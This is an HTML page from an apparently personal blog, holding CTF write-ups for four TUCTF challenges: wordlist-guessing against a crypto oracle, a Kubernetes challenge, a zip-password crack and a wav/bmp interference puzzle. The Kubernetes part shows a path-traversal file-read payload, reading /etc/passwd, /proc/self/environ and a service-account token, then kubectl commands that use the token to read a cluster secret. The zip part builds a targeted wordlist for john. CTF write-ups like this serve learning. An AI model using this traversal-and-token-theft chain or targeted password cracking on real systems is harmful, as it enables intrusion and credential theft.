@@ -1,0 +1,807 @@
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Libre+Barcode+128+Text&family=Barlow&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="default.min.css">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+    <title>cane</title>
+</head>
+<body>
+    <div class="flex">
+    
+        <div class="main">
+        <h1 class="barcode">tuctf</h1>
+        
+        <p>solved some stuff. overall i had a great time during this ctf, i think the challenges were very well put together and covered some cool topics, and it made for a fun weekend. we placed 3rd in the open category as ssm. fave challenges included <b>alien interference</b>, <b>haunted game</b>, <b>so many states</b>, <b>silly cloud</b>, and <b>arcane</b>.</p>
+        
+        <div class="wu">
+            <h1 class="heading">arcane - 492pts, 15 solves</h1>
+            <p>this was half solved by my teammate minty, yoinked half her code that was interacting with the program. i solved parts 5, 6, 7, and will cover those.</p>
+
+            <p>if youre doing enough ctfs you have to learn about the glorious art of the steal, how to cheese and skate by without actually knowing what on earth is going on. sometimes this is called engineers intuition, arriving at a solution without fully understanding the problem at hand. in many ctfs there are probably 4 or 5 challenges that you can sneak your way through and this was one of them. dont expect this to be a thorough explanation of the encryption methods at the heart of this challenge because <b>as of writing i still dont know.</b></p>
+
+            <p>
+                challenge overview: there are 8 encryption methods that must be cracked to get the flag, named after arcane characters. you're able to pass in a string and get its encoded version, and are supposed to reverse engineer the mechanism that encodes the string. the challenge gives you around 50 example strings you need to solve without timing out per subproblem.
+
+            </p>
+
+            <p>
+                the encryption methods take a printable string and typically output a printable string of the same length. by printable i mean ascii characters, and 90% of the time they're uppercase english letters. some of the easier levels include vigenere, caesar shifting, so on etc.
+            </p>
+
+            <p>
+                the art of the steal lies in exploiting two things:
+                <ol>
+                    <li>
+                        it's perfectly fine to submit wrong answers, just as long as you eventually submit the right one.
+                    </li>
+                    <li>
+                        all the answers are english words that can be found in a wordlist.
+                    </li>
+                </ol>
+            </p>
+            <p>
+                let's say i've halfway cracked one of the encryption methods, and am able to accurately recover maybe five or six of the letters, out of an 11 letter word. i'm now left with the following pattern:
+            </p>
+
+            <pre><code>ACC?S????????</code></pre>
+
+            <p>
+                this is basically now a game of hangman. get a suitably big wordlist, import it, and do some regex hunting to find your a suitable word:
+            </p>
+
+            <pre><code>
+┌──(navi@jinxed)-[~/…/ctf/tu/crypto/arcane]
+└─$ cat yaoi.py 
+import re
+
+wordlist = open('arcane.txt').read().split('\n')
+
+
+decrypted = "ACC.S........"
+pattern = re.compile(decrypted, re.IGNORECASE)
+for word in wordlist:
+    if pattern.match(word) and len(word) == len(decrypted):
+        print(word)
+                                                                                                                
+┌──(navi@jinxed)-[~/…/ctf/tu/crypto/arcane]
+└─$ python yaoi.py
+accessariness
+accessaryship
+accessibility
+accessoriness
+accustomation
+    </code></pre>
+
+            <p>
+                if we're able to generate this list, we can just repeatedly send each word to the server and wait until we get the right one. the next step is then simple. how do we get these patterns? how do we figure out which letters are confirmed to be in the decrypted word, and which ones aren't? 
+            </p>
+
+            <p>
+                now we actually have to begin attacking the black boxes of each function. i wrote a simple script to automate getting inputs / outputs from my level of choice (largely building off of minty's code, you'll be able to tell the difference between my code and hers because hers is nice and cleanly formatted and mine looks like a 11 year old wrote it).
+            </p>
+
+            <pre><code>
+import socket
+import re
+from datetime import datetime
+
+class ArcaneSolver:
+    def __init__(self, host, port):
+        self.host = host
+        self.port = port
+        self.current_level = 0  # Start at Level 0
+        self.sock = None
+
+    def connect(self):
+        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        self.sock.settimeout(5)
+        self.sock.connect((self.host, self.port))
+
+    def log(self, message, role="CLIENT"):
+        timestamp = datetime.now().strftime("%H:%M:%S.%f")[:-3]
+        print(f"[{timestamp}] [{role}] {message}")
+
+    def clean_ansi(self, text):
+        return re.sub(r'\x1b\[[0-9;]*m', '', text)
+
+    def recv_until_prompt(self, prompt_pattern):
+        buffer = ""
+        while True:
+            try:
+                data = self.sock.recv(4096).decode('utf-8', errors='replace')
+                if not data:
+                    break
+                cleaned = self.clean_ansi(data)
+                buffer += cleaned
+                if re.search(prompt_pattern, buffer):
+                    return buffer
+            except socket.timeout:
+                self.log("Timeout waiting for data", "ERROR")
+                break
+        return buffer
+
+    def send(self, message):
+        if not message.endswith('\n'):
+            message += '\n'
+        self.log(f"Sending: {message.strip()}")
+        self.sock.sendall(message.encode())
+
+    def handle_levels(self):
+        menu = self.recv_until_prompt(r'What level\?\s*$')
+        self.current_level = 7
+        self.send(str(self.current_level))
+
+        # Get level setup
+        setup = self.recv_until_prompt(r'Give me text:\s*$')
+        message = input('enter messsage... ')
+        self.send(message)
+        buffer = self.recv_until_prompt('Decrypt')
+        encrypted_message = buffer.split('\n')[0].split('s')[-1].lstrip(" ")
+        decrypted_message = []
+        for _ in encrypted_message.split(' '):
+            decrypted_message.append(int('0x' + _, 16))
+        nums = [ord(i) for i in message.upper()]
+        diffs = [nums[i] - decrypted_message[i] for i in range(len(decrypted_message))]
+        print(''.join(chr(x) for x in decrypted_message))
+        print(nums)
+        print([nums[i] - nums[i + 1] for i in range(len(nums) - 1)])
+        print([decrypted_message[i] - decrypted_message[i + 1] for i in range(len(nums) - 1)])
+        print(decrypted_message)
+        print(diffs)
+
+if __name__ == "__main__":
+    solver = ArcaneSolver('chal.tuctf.com', 30002)
+    solver.connect()
+    for i in range(1, 100):
+        solver.handle_levels()
+
+            </code></pre>
+
+            <p>
+                just as a general ctf tip, writing scripts like this to automate information gathering is a really good idea. it makes your experience a lot more enjoyable if you just take the time to build the right tools for yourself. anyway sending in some basic inputs for level 5...
+            </p>
+            
+            <pre><code>
+┌──(navi@jinxed)-[~/…/ctf/tu/crypto/arcane]
+└─$ python helper.py
+[01:40:53.510] [CLIENT] Sending: 5
+enter messsage... fudanshipride
+[01:40:55.488] [CLIENT] Sending: fudanshipride
+FUDANSCEMPEAN
+[01:40:58.834] [CLIENT] Sending: 5
+enter messsage... ifyourereadingthisyouregay
+[01:41:24.285] [CLIENT] Sending: ifyourereadingthisyouregay
+IFYOUREREADINEQADPXJSMUEIX
+            </code></pre>
+        
+        <p>
+            it seems like this encryption mechanism leaves the first half completely unaltered. (we can test with a lot more patterns, and it does hold up). so our pattern is just
+            "ABCD....", where "ABCDEFGH" is the word we receive from naively decrypting the hex string. we write a quick solver.
+        </p>
+
+        <pre><code>
+def solve_level5(hex_str):
+    alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
+    hex_values = hex_str.strip().split()
+    encrypted = [bytes.fromhex(h).decode('latin-1') for h in hex_values]
+    first_half = encrypted[:len(encrypted) // 2]
+    second_half = encrypted[len(encrypted) // 2:]
+    decrypted = ''.join(first_half)
+    d = re.compile(''.join(first_half) + ''.join(['.' for _ in range(len(encrypted) // 2)]), re.IGNORECASE)
+    print(pattern, d)
+    weaker_candidates = []
+    for word in wordlist:
+        if d.match(word) and len(decrypted) == len(word):
+            word = word.upper()
+            limit = len(word) // 2 + 1
+            flag = True
+            for char_a, char_b in zip(word, ''.join(encrypted)):
+                #print(char_a, char_b, ord(char_a) - ord(char_b))
+                if ord(char_a) - ord(char_b) > limit:
+                    flag = False
+                    break
+            if flag:
+                #print(f'{word} is good')
+                weaker_candidates.append(word)
+    return weaker_candidates
+        </code></pre>
+
+        <p>run it...</p>
+
+        <pre><code>
+┌──(navi@jinxed)-[~/…/ctf/tu/crypto/arcane]
+└─$ python misty.py 
+[01:48:48.720] [CLIENT] Connecting to chal.tuctf.com:30002
+[01:48:49.057] [CLIENT] Connection established
+[01:48:50.287] [SERVER] Received:
+
+Welcome to this year's rendition of Never Ending Crypto, this time with an Arcane twist.
+
+You can complete these levels in any order, but I recommend you do 6 and 7 last, as they build on previous levels.
+
+
+0: Hextech                      Incomplete
+1: Caitlyn                      Incomplete
+2: Jinx                         Incomplete
+3: Vi                           Incomplete
+4: Isha                         Incomplete
+5: Ekko                         Incomplete
+6: Timebomb                     Incomplete
+7: Arcane                       Incomplete
+
+What level? 
+Not a number
+
+0: Hextech                      Incomplete
+1: Caitlyn                      Incomplete
+2: Jinx                         Incomplete
+3: Vi                           Incomplete
+4: Isha                         Incomplete
+5: Ekko                         Incomplete
+6: Timebomb                     Incomplete
+7: Arcane                       Incomplete
+
+What level? 
+[01:48:50.288] [CLIENT] Selecting level 5
+[01:48:50.288] [CLIENT] Sending: 5
+[01:48:50.543] [SERVER] Received:
+
+
+
+Level 5: Ekko
+
+
+
+[01:48:50.545] [SERVER] Received:
+Give me text:
+
+[01:48:50.545] [CLIENT] Sending: hex
+[01:48:50.798] [SERVER] Received:
+HEX encrypted is 48 44 58
+
+Decrypt 41 42 52 4f 45 41 54 43
+
+[01:48:50.799] [CLIENT] Challenge: 41 42 52 4f 45 41 54 43
+len(solution) = 1
+[01:48:50.904] [CLIENT] Sending: ABROGATE
+[01:48:51.208] [SERVER] Received:
+
+Nice job!
+
+Decrypt 4d 41 47 4e 48 44 59
+
+[01:48:51.208] [CLIENT] Challenge: 4d 41 47 4e 48 44 59
+len(solution) = 1
+[01:48:51.300] [CLIENT] Sending: MAGNIFY
+[01:48:51.607] [SERVER] Received:
+
+Whoop whoop!
+
+Decrypt 4f 46 46 50 52 47 4c 54
+
+[01:48:51.607] [CLIENT] Challenge: 4f 46 46 50 52 47 4c 54
+len(solution) = 1
+[01:48:51.701] [CLIENT] Sending: OFFPRINT
+[01:48:52.027] [SERVER] Received:
+
+Yeah! You do that Crypto!
+
+Decrypt 42 55 46 44 42 4b 4e
+
+[01:48:52.028] [CLIENT] Challenge: 42 55 46 44 42 4b 4e
+len(solution) = 1
+[01:48:52.133] [CLIENT] Sending: BUFFALO
+[01:48:52.436] [SERVER] Received:
+
+Way to go!
+        </code></pre>
+
+        <p>skibidi...</p>
+
+        <p>the next challenge, 6, is, well...</p>
+
+        <pre><code>
+┌──(navi@jinxed)-[~/…/ctf/tu/crypto/arcane]
+└─$ python helper.py
+[01:51:17.846] [CLIENT] Sending: 6
+enter messsage... ohtheskibidieverybodywantstobemyenemy
+[01:51:24.653] [CLIENT] Sending: ohtheskibidieverybodywantstobemyenemy
+¶¿Ë¿¼Ê²°¹°»°¼Í¼ÉÀ¹½¼ÏÌ¶ºµ´µ½¿Ê¸ÏÊºÊ¸Ï
+        </code></pre>
+
+        <p>
+            no idea whats going on, but since these are all printable characters i updated the code to show me the differences in ascii codes between my plaintext and its encrypted string, and it reveals a strange pattern...
+        </p>
+
+        <pre><code>
+┌──(navi@jinxed)-[~/…/ctf/tu/crypto/arcane]
+└─$ python helper.py
+[01:53:44.212] [CLIENT] Sending: 6
+enter messsage... imgayandipissandshitallovertheplace
+[01:53:50.384] [CLIENT] Sending: imgayandipissandshitallovertheplace
+°´¾¸À¸µ»°Ç°ÊÊ¸µ»ÊÇÊÉ°¼¼±ÌÀ¶ÉÇÀ²¼°¾À
+[73, 77, 71, 65, 89, 65, 78, 68, 73, 80, 73, 83, 83, 65, 78, 68, 83, 72, 73, 84, 65, 76, 76, 79, 86, 69, 82, 84, 72, 69, 80, 76, 65, 67, 69]
+[-103, -103, -119, -119, -103, -119, -103, -119, -103, -119, -103, -119, -119, -119, -103, -119, -119, -127, -129, -117, -111, -112, -112, -98, -118, -123, -100, -117, -127, -123, -98, -112, -111, -123, -123]
+        </code></pre>
+
+        <p>
+            again, the two halves are undergoing different encryption methods. in the first half, it either adds 103 or 119 to the ascii code, and the second half i genuinely still don't even understand but we can derive enough from the first half so we just pay it no mind for now.
+        </p>
+
+        <p>
+            more testing reveals that it is only those two values that are possible, and it's unclear how the values are determined. but we don't really need to determine that anyway! we can just assume that it can be both characters, and write our regex accordingly.
+        </p>
+
+        <p>
+            our regex will look something like:
+        </p>
+
+        <pre><code>
+A[BC][DE][FG]....
+        </code></pre>
+
+        <p>where [BC], [DE], [FG] etc.. are the characters you get when subtracting 103 or 119 from the encrypted text. this actually does not narrow it down too much. my candidates list grows to around 100, and shrinks to 10 or 15 if we're lucky. but regardless, it's good enough to completely circumvent the encryption mechanism:</p>
+
+        <pre><code>
+[01:57:45.434] [CLIENT] Challenge: bb bc b3 c7 bd be b4 cc ca
+['bb', 'bc', 'b3', 'c7', 'bd', 'be', 'b4', 'cc', 'ca']
+DT
+EU
+L
+P
+19
+len(solution) = 5
+[01:57:45.500] [CLIENT] Sending: delphacid
+[01:57:45.500] [CLIENT] Sending: delphinic
+[01:57:45.500] [CLIENT] Sending: delphinid
+[01:57:45.500] [CLIENT] Sending: delphinin
+[01:57:45.500] [CLIENT] Sending: delphinus
+[01:57:45.738] [SERVER] Received:
+
+You can do better.     
+        </code></pre>
+
+        <p>
+            and now onto part 7... time to do the same shit:
+        </p>
+
+        <pre><code>
+┌──(navi@jinxed)-[~/…/ctf/tu/crypto/arcane]
+└─$ python helper.py 
+[02:00:41.261] [CLIENT] Sending: 7
+enter messsage... ijustfrewuptheloveofmydreams
+[02:00:44.646] [CLIENT] Sending: ijustfrewuptheloveofmydreams
+EHTPUWERFTSUJIMBEULPYBWDUQDA
+[02:00:48.011] [CLIENT] Sending: 7
+enter messsage... heisinmyheartheisinmyears
+[02:00:54.749] [CLIENT] Sending: heisinmyheartheisinmyears
+RAEHYMNISIEHPORYXFGSPSYIQ
+        </code></pre>
+
+        <p>
+            it's a little hard to see, but the first half is just reversed in the output string. this is definitely enough to solve since we recover the entire first half.
+        </p>
+
+        <p>
+            our regex is then:
+        </p>
+
+        <pre><code>
+            DBCA....
+        </code></pre>
+
+        <p>
+            where our string that we receive is ABCD.... - write another quick solver:
+        </p>
+
+        <pre><code>
+def solve_level7(self, hex_str):
+hex_values = hex_str.strip().split()
+encrypted = [int('0x' + _, 16) for _ in hex_values]
+first_half = encrypted[:len(encrypted) // 2]
+second_half = encrypted[len(encrypted) // 2:]
+pattern = "".join(chr(_) for _ in first_half[::-1]) + "." * len(second_half)
+d = re.compile(pattern, re.IGNORECASE)
+candidates = []
+for word in wordlist:
+    if d.match(word) and len(word) == len(encrypted):
+        candidates.append(word)
+return candidates
+        </code></pre>
+
+        <p>
+            with that, we can just run the code...
+        </p>
+
+        <pre><code>
+┌──(navi@jinxed)-[~/…/ctf/tu/crypto/arcane]
+└─$ python misty.py 
+[02:04:46.609] [CLIENT] Connecting to chal.tuctf.com:30002
+[02:04:46.910] [CLIENT] Connection established
+[02:04:47.730] [SERVER] Received:
+
+Welcome to this year's rendition of Never Ending Crypto, this time with an Arcane twist.
+
+[SEVERAL LINES REDACTED]
+        </code></pre>
+
+        <p>and...</p>
+
+        <pre><code>
+Whoop whoop!
+
+Congratulations! You beat Level 7!
+
+
+What could have been?
+
+Here's your flag:
+TUCTF{wh4t_c0u1d_h4v3_b33n}
+
+
+[02:07:26.861] [CLIENT] Level 7 completed!
+[02:07:26.861] [CLIENT] Connection closed
+        </code></pre>
+
+        <p>done!</p>
+
+        </div>
+
+        <div class="wu">
+            <h1 class="heading">silly cloud - 470pt, 27 solves</h1>
+
+            <p>i didn't fully solve this, my teammates found the lfi on the application and i worked from there doing all the cloud work. i've never interacted with k8s before so it was cool to try it out.</p>
+
+            <p>the lfi is here:</p>
+            
+            <pre><code>https://silly-cloud.tuctf.com/logs?service=../../../etc/passwd</code></pre>
+
+            <pre><code>
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
+_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+app:x:1000:1000::/nonexistent:/usr/sbin/nologin
+            </code></pre>
+
+            <p>we check the usual suspects. /etc/passwd, app.py, etcetera... nothing interesting, until we look at /proc/self/environ (which you should just always do by default if you have lfi)</p>
+
+            <pre><code
+>PATH=/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin�
+HOSTNAME=silly-cloud-6cc798ddbb-tbd2h�LANG=C.UTF-8�
+GPG_KEY=A035C8C19219BA821ECEA86B64E628F8D684696D�PYTHON_VERSION=3.10.16�
+PYTHON_SHA256=bfb249609990220491a1b92850a07135ed0831e41738cf681d63cf01b2a8fbd1�
+SECRETS_NAMESPACE=secret-namespace�
+DEV_CLUSTER_ADDR=https://7b9fc16d-5421-47b3-ab64-83dfee3050eb.k8s.ondigitalocean.com...
+            </code></pre>
+
+            <p>i filtered out a bunch of irrelevant stuff, but here we can tell that this server is somehow linked to k8s in some way, and there's the external api and the name of a certain namespace.</p>
+
+            <p>at this point i realize i'm completely out of my element and do a few google searches for "k8s ctftime", "k8s ctf writeup", "enumerating k8s" that turn up kind of empty. i'm not sure what to do here and what to look for and i'm looking for guidance, and i eventually find it through my lord and saviour, 0xdf, who you'll probably be familiar with if you're in cyber. he does writeups for hackthebox machines, and there's a specific box Unobtainium that deals with exploiting k8s through information gathered via lfi.</p>
+
+            <p><a href="https://0xdf.gitlab.io/2021/09/04/htb-unobtainium.html">heres the post.</a> he shows where the kubernetes jwt and ca.crt are located, so we lfi those:</p>
+
+            <pre><code>
+#/run/secrets/kubernetes.io/serviceaccount/token
+eyJhbGciOiJSUzI1NiIsImtpZCI6IjU2NnhHZDhPTm...
+
+#/run/secrets/kubernetes.io/serviceaccount/ca.crt
+-----BEGIN CERTIFICATE-----
+MIIDJzCCAg+gAwIBAgICBnUwDQYJKoZIhvcNAQELBQAwMzEVMBMGA1UEChMMRGln
+aXRhbE9jZWFuMRowGAYDVQQDExFrOHNhYXMgQ2x1c3RlciBDQTAeFw0yNTAxMjAy
+            </code></pre>
+
+            <p>
+                skibidi. okay anyways i still have no idea what im doing so i just keep consulting the 0xdf writeup, he tells me to run a certain command to enumerate permissions, so i do:
+            </p>
+
+            <pre><code>
+┌──(navi@jinxed)-[~/…/ctf/tu/misc/cloud]
+└─$ kubectl auth can-i --list --token $TOKEN --server https://7b9fc16d-5421-47b3-ab64-83dfee3050eb.k8s.ondigitalocean.com/ --certificate-authority ca.crt
+
+[...] unnecessary lines removed
+[/version/]                            []                  [get]
+[/version]                             []                  [get]
+[/version]                             []                  [get]
+[top-secret-flag]   [get]
+            </code></pre>
+
+            <p>wow epic. top-secret-flag. cool! now how do we get this? 0xdf stops helping, and i inevitably end up with this command, which i honestly can't really explain:</p>
+
+            <pre><code>
+┌──(navi@jinxed)-[~/…/ctf/tu/misc/cloud]
+└─$ kubectl get secret top-secret-flag -n secret-namespace -o jsonpath="{.data}" --token $TOKEN --server https://7b9fc16d-5421-47b3-ab64-83dfee3050eb.k8s.ondigitalocean.com/ --certificate-authority ca.crt | jq -r 'to_entries[] | "\(.key): \(.value | @base64d)"'
+flag: TUCTF{3ven_m04r_51lly_d3f4ul75}
+            </code></pre>
+
+            <p>but woohoo! there it is. cool challenge!</p>
+        </div>
+
+        <div class="wu">
+            <h1 class="heading">blog posting - 499pt, 7 solves</h1>
+
+            <p>only solved this after an update was made that said "the zip file is now different, the solve path is still the same though. the challenge consists of a static website and a password protected zip file, whose password doesnt crack with rockyou, so we figure we need to find the password somewhere.</p>
+
+            <p>i guessed that the change made is reducing the iteration count on the zip hash so that brute forcing it is less painful, and i was right. therefore, we thought some more about where to get the password, and figured it had to be with words from the website itself.</p>
+
+            <p>the website contains three main pieces of interesting information:
+                <ol>
+                    the years the blog posts were created
+                </ol>
+                <ol>
+                    the name of the owner's dog (in the filename of the image, 'picOfHash')
+                </ol>
+                <ol>
+                    the owner's favorit ebooks
+                </ol>
+            </p>
+
+            <p>
+                theres really not much else on the site to try, and these three things stick out immediately as the big ones. however if you're smart and write a script to automatically generate wordlists to pass to john, you can trial and error some wordlists pretty quickly.
+            </p>
+
+            <p>
+                anyways my code iterates through a few things. i compiled a list of potential words from the list of books, e.g. there's Rappacinni's Daughter listed, so i added Rappacinni, and Daughter, and RappacinnisDaughter, and Rappacinni's Daughter, and Rappacinni'sDaughter. i did this all manually which isn't too annoying given theres only 5 or so books.
+            </p>
+
+            <p>then, i figured we needed the name of the dog, and a year. i initially used 2019 and only 2019, which was a mistake because i shouldve used both 2019 and 2024 - this was the main thing blocking me from solving. once i figured out it was actually 2024 instead, </p>
+
+            <p>the final code is here:</p>
+
+            <pre><code>
+┌──(navi@jinxed)-[~/…/ctf/tu/rev/pluh]
+└─$ cat permute.py
+from itertools import permutations, combinations
+
+books = [
+    "RappacinnisDaughter",
+    "TheSphinx",
+    "Sphinx",
+    "Expanse",
+    "TheExpanse",
+    "Stormlight",
+    "Archive",
+    "StormlightArchive",
+    "TheStormlightArchive",
+    "1984",
+    "American",
+    "Prometheus",
+    "AmericanPrometheus"
+]
+
+years = {"2019", "2024"}
+dog = "Hash"
+
+passwords = open('passwords.txt', 'w')
+
+with open("passwords.txt", "w") as passwords:
+    for book in books:
+        for year in years:
+            items = [book, dog, year]
+            for perm in list(permutations(items)):
+                password = ''.join(perm)
+                passwords.write(password + '\n')
+                passwords.write(password.upper() + '\n')
+                passwords.write(password.lower() + '\n')
+            </code></pre>
+
+            <p>run it up:</p>
+
+            <pre><code>
+┌──(navi@jinxed)-[~/…/ctf/tu/rev/pluh]
+└─$ john flag.txt --show                  
+flag.zip/flag.txt:HashStormlight2024:flag.txt:flag.zip::flag.zip
+
+1 password hash cracked, 0 left
+            </code></pre>
+
+            <p>unzip it:</p>
+
+            <pre><code>
+┌──(navi@jinxed)-[~/…/ctf/tu/rev/pluh]
+└─$ unzip flag.zip      
+Archive:  flag.zip
+[flag.zip] flag.txt password: 
+replace flag.txt? [y]es, [n]o, [A]ll, [N]one, [r]ename: y
+ extracting: flag.txt                
+                                                                                                            
+┌──(navi@jinxed)-[~/…/ctf/tu/rev/pluh]
+└─$ cat flag.txt     
+TUCTF{p@55w0rd_cr@ck1ng_m@st3r_s3998f}
+            </code></pre>
+        </div>
+
+        <div class="wu">
+            <h1 class="heading">alien interference - 498, 9 solves</h1>
+
+            <p>cool challenge! its a site w/ a .wav file and a .bmp file which is datamoshed, and we need to undo this datamoshing somehow.</p>
+            
+            <img src="images/alien.bmp">
+
+            <p>we inspect the source of the site:</p>
+
+            <pre><code>
+const checkFile = async (filename) => {
+    const response = await fetch(filename)
+    const buffer = await response.arrayBuffer();
+    const view = new DataView(buffer)
+    const chunkID = String.fromCharCode(view.getUint8(0), view.getUint8(1), view.getUint8(2), view.getUint8(3));
+    const format = String.fromCharCode(view.getUint8(8), view.getUint8(9), view.getUint8(10), view.getUint8(11));
+    console.log(`chunkID: ${chunkID}, format: ${format}`);
+    
+    if ((view.getUint8(20) | view.getUint8(21) << 8) !== 7) { // The voices tell me this is very important. 
+        alert('Encoding Error!');
+        return;
+    }
+}        
+        </code></pre>
+
+        <p>
+            so this just checks that the wav file is indeed a .wav file. but the fact that this function was even written tells me that the .wav file is indeed important somehow, and that specific command checking if those bits are set is really interesting. what do those bits being set in the .wav file's headers mean?
+        </p>
+
+        <p>
+            quick search reveals that at those bits, it specifies the 'format' of the audio encoding. not really sure what this means but our value 7 corresponds to 'U-law' encoding, which must be useful somehow. what do we do?
+        </p>
+
+        <p>
+            in physics, <i>destructive interference</i> is the concept of 'removing' a wave from another wave via addition of the wave's inverse. i'm bad at explaining this because i have no physics background, here's an excerpt from galactic puzzle hunt 2018's puzzle solution about the concept, which i referred to a few times while solving.
+        </p>
+
+        <img src="images/interference.png">
+
+        <p>
+            so what exactly is going on here? let's go through a bit more information first.
+        </p>
+
+        <pre><code>
+┌──(navi@jinxed)-[~/…/ctf/tu/misc/alien]
+└─$ ls -alps cat.bmp           
+1184 -rw-r--r-- 1 navi navi 1211798 Jan 26 09:09 cat.bmp
+                                                                                                            
+┌──(navi@jinxed)-[~/…/ctf/tu/misc/alien]
+└─$ ls -alps four.wav 
+1172 -rw-r--r-- 1 navi navi 1197562 Jan 26 09:10 four.wav
+        </code></pre>
+
+        <p>
+            the file sizes are indeed very similar, but not quite exactly the same. the explanation for what's going on is simple: <b>the bmp file has the wav file overlaid on top of it.</b> in audacity, you can import bmp files as raw data, interpreting it as a waveform. then, you import an actual .wav file, add the two waveforms together, and export as a .bmp file.
+        </p>
+
+        <p>
+            there's some nuance to this wrt the file headers: you need to make sure the first few hundred bytes or so are unaltered so that it actually gets read as a bmp file, hence why the .wav is a little smaller than the .bmp. so how do we actually unencrypt the file? simple:
+            <ol>
+                <li>open bmp as raw data with U-law encoding.</li>
+                <li>import wav as well (as audio).</li>
+                <li>invert the .wav, then mix the two tracks together.</li>
+                <li>export as raw data.</li>
+            </ol>
+            each of these stesp can be done in audacity.
+        </p>
+
+        <img src="images/audacity.png">
+
+        <p>just from inspection we can see that the waveforms are very similar. but anyways, proceeding with the inversion...</p>
+
+        <img src="images/audacity2.png">
+
+        <p>the resulting waveform looks a lot cleaner which is nice. save it, and open it to get the flag:</p>
+
+        <img src="images/blorp.bmp">
+        </div>
+    </div>
+</body>
+
+<script>
+    hljs.highlightAll()
+document.addEventListener("DOMContentLoaded", function() {
+    const sidebar = document.querySelector('.sidebar');
+    const main = document.querySelector('.main');
+    const images = Array.from(sidebar.querySelectorAll('img')); // Convert NodeList to Array for easier manipulation
+
+    function fillSidebar() {
+        const mainHeight = main.offsetHeight;
+        let sidebarHeight = sidebar.offsetHeight;
+
+        while (sidebarHeight < mainHeight && images.length > 0) {
+            const randomIndex = Math.floor(Math.random() * images.length);
+            const clonedImage = images[randomIndex].cloneNode(true);
+
+            sidebar.appendChild(clonedImage);
+
+            sidebarHeight = sidebar.offsetHeight;
+        }
+    }
+
+    //fillSidebar();
+});
+</script>
+</html>
+
+<style>
+
+    img {
+        width: 100%;
+        margin-block: 10px;
+    }
+
+    .sidebar {
+        padding-inline: 50px;
+        width: 20%;
+    }
+    .wu {
+        padding: 5px;
+    }
+
+    .heading {
+        text-align: left;
+    }
+    .main {
+        width: clamp(500px, 60%, 70%);
+        margin:auto; 
+        font-family: "Barlow", serif;
+        font-size: 20px;
+        height: fit-content;
+    }
+
+    li {
+        text-align: left;
+        line-height: 30px;
+    }
+    
+    p {
+        text-align: justify;
+        line-height: 30px;
+    }
+
+    .barcode {
+        font-family: "Libre Barcode 128 Text";
+        font-size: 100px;
+        line-height: 50px;
+    }
+    
+    html {
+        background-color: #111;
+        color: #ececec
+    }
+    .flex {
+        display: flex;
+        align-items: flex-start;
+    }
+
+    @media only screen and (max-width: 768px) {
+        .main {
+            font-size: 16px;
+            line-height: 10px;
+            width: 90%;
+        }
+
+        .sidebar {
+            display: none;
+        }
+
+        pre code {
+            line-height: 20px;
+            font-size: 15px;
+        }
+    }
+
+</style>
